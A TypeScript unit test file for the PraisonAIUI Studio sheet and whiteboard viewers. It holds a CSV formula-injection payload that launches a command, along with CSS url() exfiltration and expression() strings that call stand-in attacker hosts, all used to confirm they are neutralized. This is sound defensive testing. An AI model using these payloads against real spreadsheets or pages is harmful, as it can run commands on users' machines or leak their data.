/**
 * Unit tests for PraisonAIUI Studio viewers:
 * - Safe zero-eval spreadsheet formula engine + CSV neutralization
 * - SheetViewer multi-tab, shorthand, malformed JSON, streaming placeholder
 * - WhiteboardViewer S1 CSS url(...) exfiltration blocking, unique SVG markers,
 *   large-board bounds, malformed JSON, streaming placeholder
 * - Decoupled fenceRegistry + artifact derivation for ```sheet and ```whiteboard
 */
import assert from 'node:assert/strict'
import { test } from 'node:test'
import { createElement } from 'react'
import { renderToStaticMarkup } from 'react-dom/server'
import { deriveArtifacts } from '@/layout-features/artifacts/derive'
import { getFenceViewer, registerFenceViewer } from '@/markdown/fenceRegistry'
import { colLabel, evaluateSheet, sheetToCsv } from './formula'
import SheetViewer from './SheetGrid'
import WhiteboardViewer, { safeBoardColor } from './Whiteboard'

test('formula engine evaluates SUM, AVERAGE, MIN, MAX, COUNT, IF, arithmetic, cycles, and #DIV/0!', () => {
  const grid = [
    ['Item', 'Qty', 'Price', 'Total', 'Tier'],
    ['GPU', 4, 250, '=B2*C2', '=IF(D2>=1000,"High","Low")'],
    ['RAM', 8, 50, '=B3*C3', '=IF(D3>=1000,"High","Low")'],
    ['Total', '=SUM(B2:B3)', '=AVERAGE(C2:C3)', '=SUM(D2:D3)', '=COUNT(D2:D3)'],
    ['Edge', '=MIN(B2:B3)', '=MAX(C2:C3)', '=10/0', '=E5'],
  ]
  const out = evaluateSheet(grid)
  assert.equal(out[1][3], 1000)
  assert.equal(out[1][4], 'High')
  assert.equal(out[2][3], 400)
  assert.equal(out[2][4], 'Low')
  assert.equal(out[3][1], 12)
  assert.equal(out[3][2], 150)
  assert.equal(out[3][3], 1400)
  assert.equal(out[3][4], 2)
  assert.equal(out[4][1], 4)
  assert.equal(out[4][2], 250)
  assert.equal(out[4][3], '#DIV/0!')
  assert.equal(out[4][4], '#CYCLE!')
  assert.equal(colLabel(0), 'A')
  assert.equal(colLabel(26), 'AA')
})

test('sheetToCsv neutralizes spreadsheet formula injection on export', () => {
  const csv = sheetToCsv([
    ['Name', 'Formula'],
    ['Safe, "quoted"', '=CMD|"/C calc"!A0'],
  ])
  assert.ok(csv.includes('"Safe, ""quoted"""'))
  assert.ok(csv.includes("'=CMD"))
})

test('SheetViewer renders computed values, tabs, shorthand headers/rows, streaming & malformed JSON safely', () => {
  const html = renderToStaticMarkup(
    createElement(SheetViewer, {
      content: JSON.stringify({
        title: 'Q4 Budget',
        tabs: [
          { name: 'Summary', grid: [['Dept', 'Spend'], ['Eng', 400], ['Ops', 600], ['Total', '=SUM(B2:B3)']] },
          { name: 'Notes', grid: [['Note'], ['Approved']] },
        ],
      }),
    }),
  )
  assert.ok(html.includes('Q4 Budget'))
  assert.ok(html.includes('1,000'))
  assert.ok(html.includes('Summary'))
  assert.ok(html.includes('Notes'))

  const shortHtml = renderToStaticMarkup(
    createElement(SheetViewer, {
      content: JSON.stringify({ title: 'Quick', headers: ['A', 'B'], rows: [[10, '=A2*2']] }),
    }),
  )
  assert.ok(shortHtml.includes('20'))

  const streamingHtml = renderToStaticMarkup(createElement(SheetViewer, { content: '{"title": "partial', streaming: true }))
  assert.ok(streamingHtml.includes('data-aiui-sheet="streaming"'))

  const invalidHtml = renderToStaticMarkup(createElement(SheetViewer, { content: '{bad' }))
  assert.ok(invalidHtml.includes('not valid JSON'))
})

test('WhiteboardViewer blocks S1 CSS url() / expression() exfiltration and uses unique SVG marker IDs', () => {
  assert.equal(safeBoardColor('#abcdef', 0), '#abcdef')
  assert.equal(safeBoardColor('blue', 0), '#bfdbfe')
  // Malicious CSS injection attempts must fall back to safe palette hex
  assert.ok(/^#[0-9a-f]{6}$/i.test(safeBoardColor('url(https://attacker.example/leak)', 0)))
  assert.ok(/^#[0-9a-f]{6}$/i.test(safeBoardColor('expression(alert(1))', 1)))
  assert.ok(/^#[0-9a-f]{6}$/i.test(safeBoardColor('red; background-image: url(https://evil.test)', 2)))

  const payload = JSON.stringify({
    title: 'Launch Plan',
    items: [
      { id: 'a', type: 'sticky', text: 'Idea', x: 20, y: 20, color: 'url(https://attacker.example/p)' },
      { id: 'b', type: 'sticky', text: 'Ship', x: 260, y: 20, color: '#bbf7d0' },
      { type: 'arrow', from: 'a', to: 'b', label: 'next' },
    ],
  })
  const html = renderToStaticMarkup(
    createElement('div', null, createElement(WhiteboardViewer, { content: payload }), createElement(WhiteboardViewer, { content: payload })),
  )
  assert.ok(!html.includes('attacker.example'), 'CSS url() exfiltration must never reach rendered HTML')
  assert.ok(html.includes('Idea') && html.includes('Ship'))
  const markers = [...html.matchAll(/<marker id="([^"]+)"/g)].map((m) => m[1])
  assert.equal(markers.length, 2)
  assert.notEqual(markers[0], markers[1], 'Multiple whiteboards on one page must have distinct marker IDs')

  const streamingHtml = renderToStaticMarkup(createElement(WhiteboardViewer, { content: '{"items":[', streaming: true }))
  assert.ok(streamingHtml.includes('data-aiui-whiteboard="streaming"'))
})

test('deriveArtifacts turns ```sheet and ```whiteboard fences into studio artifacts regardless of line count', () => {
  const { versions: derived } = deriveArtifacts(
    [
      {
        id: 'm1',
        role: 'assistant',
        createdAt: 1_700_000_000_000,
        parts: [
          { type: 'text', text: '```sheet\n{"id":"s1","title":"Sales","tabs":[{"name":"Q1","grid":[["A"],[1]]}]}\n```' },
          { type: 'text', text: '```whiteboard\n{"id":"w1","title":"Flow","items":[{"id":"n1","text":"Start"}]}\n```' },
        ],
      },
    ],
    'sess-1',
  )
  assert.equal(derived.length, 2)
  assert.equal(derived[0].kind, 'sheet')
  assert.equal(derived[0].key, 'sheet:s1')
  assert.equal(derived[0].title, 'Sales')
  assert.equal(derived[1].kind, 'whiteboard')
  assert.equal(derived[1].key, 'whiteboard:w1')
  assert.equal(derived[1].title, 'Flow')
})

test('fenceRegistry allows third-party plugins to register custom fence viewers (e.g. excalidraw)', () => {
  const Custom = ({ content }: { content: string }) => createElement('div', { 'data-custom-fence': '' }, content)
  registerFenceViewer('custom-diagram', Custom)
  assert.equal(getFenceViewer('custom-diagram'), Custom)
  assert.ok(getFenceViewer('sheet'))
  assert.ok(getFenceViewer('whiteboard'))
})
